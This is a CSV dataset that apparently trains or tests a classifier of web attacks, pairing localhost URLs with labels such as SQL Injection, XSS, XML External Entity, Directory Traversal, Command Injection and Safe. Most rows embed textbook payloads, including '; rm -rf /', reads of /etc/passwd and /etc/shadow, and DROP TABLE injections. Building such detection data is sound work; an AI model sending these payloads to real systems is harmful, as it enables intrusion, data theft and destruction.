URL,Vulnerability Type
http://127.0.0.1:5000/product?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/checkout?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/cart?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/messages?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/search?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/product?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/cart?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/file?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/messages?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/file?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/product?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/search?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/cart?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/user?msg=<img src=x onerror=alert(1)>,XSS
"http://127.0.0.1:5000/profile?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/upload?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/checkout?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/cart?load=config.php,File Inclusion
http://127.0.0.1:5000/settings?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/profile?user=admin'--,SQL Injection
http://127.0.0.1:5000/dashboard?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/comments?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/search?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/order?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/report?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/upload?load=config.php,File Inclusion
http://127.0.0.1:5000/user?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/checkout?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/product?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/upload?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/upload?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/messages?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/product?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/upload?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/download?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/download?load=config.php,File Inclusion
http://127.0.0.1:5000/order?load=config.php,File Inclusion
http://127.0.0.1:5000/file?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/comments?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/profile?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/checkout?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/admin?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/checkout?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/file?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/report?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/dashboard?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/comments?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/report?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/upload?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/settings?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/review?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/search?user=admin'--,SQL Injection
http://127.0.0.1:5000/login?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/posts?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/dashboard?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/checkout?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/review?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/order?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/upload?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/admin?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/upload?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/dashboard?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/dashboard?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/file?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/download?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/upload?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/upload?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/posts?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/search?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/comments?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/user?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/search?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/profile?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/order?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/comments?run=`whoami`,Command Injection
http://127.0.0.1:5000/comments?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/messages?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/invoice?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/checkout?command=| netstat -an,Command Injection
http://127.0.0.1:5000/order?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/login?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/messages?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/login?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/settings?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/invoice?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/posts?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/settings?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/user?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/upload?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/cart?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/profile?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/dashboard?command=| netstat -an,Command Injection
http://127.0.0.1:5000/report?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/upload?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/product?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/report?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/review?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/user?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/review?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/user?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/review?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/search?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/order?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/dashboard?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/checkout?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/order?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/report?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/user?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/invoice?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/upload?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/profile?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/product?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/admin?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/download?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/upload?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/download?command=| netstat -an,Command Injection
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/checkout?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/report?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/checkout?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/invoice?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/login?load=config.php,File Inclusion
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/settings?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/messages?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/product?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/search?user=admin'--,SQL Injection
http://127.0.0.1:5000/download?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/download?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/file?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/cart?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/checkout?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/cart?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/search?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/review?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/review?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/cart?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/messages?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/download?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/cart?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/search?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/search?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/admin?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/report?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/profile?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/dashboard?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/checkout?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/admin?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/login?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/invoice?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/admin?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/dashboard?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/review?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/posts?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/cart?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/order?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/product?run=`whoami`,Command Injection
http://127.0.0.1:5000/settings?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/search?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/search?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/product?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/search?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/posts?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/admin?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/user?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/product?run=`whoami`,Command Injection
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/profile?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/profile?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/login?load=config.php,File Inclusion
http://127.0.0.1:5000/invoice?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/posts?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/invoice?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/comments?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/review?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/posts?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/user?run=`whoami`,Command Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/user?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/download?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/login?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/messages?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/review?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/search?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/checkout?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/login?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/comments?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/invoice?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/cart?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/invoice?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/settings?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/cart?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/product?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/login?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/review?run=`whoami`,Command Injection
http://127.0.0.1:5000/dashboard?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/review?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/messages?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/messages?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/review?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/order?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/dashboard?link=//unsafe.com,Open Redirect
